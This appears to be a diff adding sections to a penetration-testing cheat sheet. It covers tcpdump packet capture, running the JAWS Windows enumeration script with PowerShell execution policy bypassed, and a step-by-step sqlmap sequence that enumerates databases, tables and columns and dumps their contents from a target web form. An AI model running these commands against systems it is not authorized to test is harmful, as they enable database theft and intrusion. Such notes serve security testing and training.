@@ -97,6 +97,13 @@ sudo mount -t vboxsf VMShared /root/Shared
 whois -h whois.arin.net <orgname>
 
 ##############################
+##### TCPDUMP          #######
+##############################
+tcpdump -D #list available interfaces
+tcpdump -c 10 -vnni eth0 #verbose, suppress hostname res and portname res
+tcpdump -s 0 -X -vnni eth0 #display whole packet 
+
+##############################
 ##### UNICORN SCAN     #######
 ##############################
 #tcp scan
@@ -1033,6 +1040,10 @@ reg query HKLM /f password /t REG_SZ /s
 ###################################
 #### WINDOWS ENUM SCRIPT     ######
 ###################################
+JAWS
+https://github.com/411Hall/Jaws.git
+powershell.exe -ExecutionPolicy Bypass -File .\jaws.ps1 -OutputFilename jenum.txt
+
 https://github.com/pentestmonkey/windows-privesc-check
 
 git clone https://github.com/absolomb/WindowsEnum.git /opt/WindowsEnum
@@ -1746,6 +1757,31 @@ Ax1024+
 #### WORDPRESS SCAN ##########
 ##############################
 wpscan -u http://<fqdn> --enumerate t --enumerate p --enumerate u
+
+##############################
+#### SQLMAP            #######
+##############################
+# search for form
+sqlmap -u https://<fqdn>/page.php --form --dbs
+
+# now use known parameters
+sqlmap -u https://<fqdn>/page.php --dbms=mysql --data "parameter1=knownval&paramter2=knownval2"
+
+# three forms of injection can be provided by sqlmap
+#enumerate databases
+sqlmap -u https://<fqdn>/page.php --dbms=mysql --data "parameter1=knownval&paramter2=knownval2" --dbs
+
+#enumerate tables in database
+sqlmap -u https://<fqdn>/page.php --dbms=mysql --data "parameter1=knownval&paramter2=knownval2" -D <db_name> --tables
+
+#enumerate columns in database
+sqlmap -u https://<fqdn>/page.php --dbms=mysql --data "parameter1=knownval&paramter2=knownval2" -D <db_name> -T <table_name> --columns
+
+#enumerate data
+sqlmap -u https://<fqdn>/page.php --dbms=mysql --data "parameter1=knownval&paramter2=knownval2" -D <db_name> -T <table_name> --dump
+
+
+
 
 ##############################
 #### DIRTY COW         #######
